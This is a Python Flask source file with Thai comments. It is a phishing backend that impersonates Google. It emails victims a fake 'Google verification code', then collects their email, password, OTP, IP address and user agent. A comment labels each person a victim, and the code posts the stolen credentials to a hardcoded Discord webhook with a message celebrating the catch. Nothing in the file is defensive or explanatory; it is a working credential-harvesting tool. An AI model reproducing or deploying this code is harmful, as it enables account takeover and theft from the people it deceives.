import os
import smtplib
import random
import requests
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

# ---------------------------------------------------------
# CONFIG ของมึง (มึงต้องเปลี่ยนตรงนี้!)
# ---------------------------------------------------------
GMAIL_USER = "mึงใส่Gmailของมึง@gmail.com"       # อีเมลที่ใช้ส่ง
GMAIL_APP_PASS = "abcd efgh ijkl mnop"         # รหัส 16 ตัวที่มึงสร้างจาก App Password
WEBHOOK_URL = "https://discord.com/api/webhooks/1525496997417717924/2XhKXiq5gHrepV5H8uDzECt2JOGBknizoq2VwN4CqbO6Vb1OSqSZ0u-eZZgQv232xAZb"

# เก็บ OTP ชั่วคราวระหว่าง Session
temp_otp_store = {}

# ---------------------------------------------------------
# ฟังก์ชันส่งอีเมล OTP จริง ๆ (ผ่าน Gmail SMTP)
# ---------------------------------------------------------
def send_real_otp_email(to_email):
    otp_code = str(random.randint(100000, 999999))
    temp_otp_store[to_email] = otp_code  # จำ OTP ไว้รอตรวจสอบ

    subject = "รหัสยืนยัน (OTP) ของคุณจาก Google"
    body = f"""
    <div style="font-family: Arial, sans-serif;">
        <h2>รหัสยืนยันบัญชี Google</h2>
        <p>เพื่อความปลอดภัยของบัญชีของคุณ เราได้ส่งรหัสยืนยันมาที่อีเมลนี้</p>
        <h1 style="font-size: 32px; letter-spacing: 4px; color: #1a73e8;">{otp_code}</h1>
        <p>รหัสนี้จะหมดอายุใน 5 นาที</p>
        <p style="color: #888; font-size: 12px;">หากคุณไม่ได้ร้องขอรหัสนี้ กรุณาเพิกเฉยต่ออีเมลนี้</p>
    </div>
    """

    msg = MIMEMultipart()
    msg['From'] = GMAIL_USER
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'html'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(GMAIL_USER, GMAIL_APP_PASS)
        server.sendmail(GMAIL_USER, to_email, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        print(f"[-] ส่งเมลไม่สำเร็จ: {e}")
        return False

# ---------------------------------------------------------
# ROUTES
# ---------------------------------------------------------
@app.route('/')
def index():
    return render_template('index.html')

# API สำหรับส่ง OTP จริงไปให้เหยื่อ
@app.route('/send_otp', methods=['POST'])
def send_otp():
    data = request.json
    email = data.get('email')
    if not email:
        return jsonify({'status': 'error', 'msg': 'กรุณากรอกอีเมล'})
    
    if send_real_otp_email(email):
        return jsonify({'status': 'success'})
    else:
        return jsonify({'status': 'error', 'msg': 'ไม่สามารถส่งรหัสยืนยันได้'})

# API สำหรับตรวจสอบ OTP ที่เหยื่อกรอก
@app.route('/verify_login', methods=['POST'])
def verify_login():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    otp = data.get('otp')
    user_agent = request.headers.get('User-Agent')
    ip = request.remote_addr

    # ตรวจสอบ OTP ที่เก็บไว้
    if email in temp_otp_store and temp_otp_store[email] == otp:
        # ส่งข้อมูลไป Webhook
        payload = {
            "content": (
                f"🔥 **จับเหยื่อ OTP จริงได้แล้ว!**\n"
                f"📧 **Email:** `{email}`\n"
                f"🔑 **Password:** `{password}`\n"
                f"📟 **OTP ที่กรอก:** `{otp}`\n"
                f"🌐 **IP:** `{ip}`\n"
                f"🖥️ **User-Agent:** `{user_agent}`"
            )
        }
        try:
            requests.post(WEBHOOK_URL, json=payload)
        except:
            pass
        
        return jsonify({'status': 'success'})
    else:
        return jsonify({'status': 'invalid_otp', 'msg': 'รหัส OTP ไม่ถูกต้อง'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)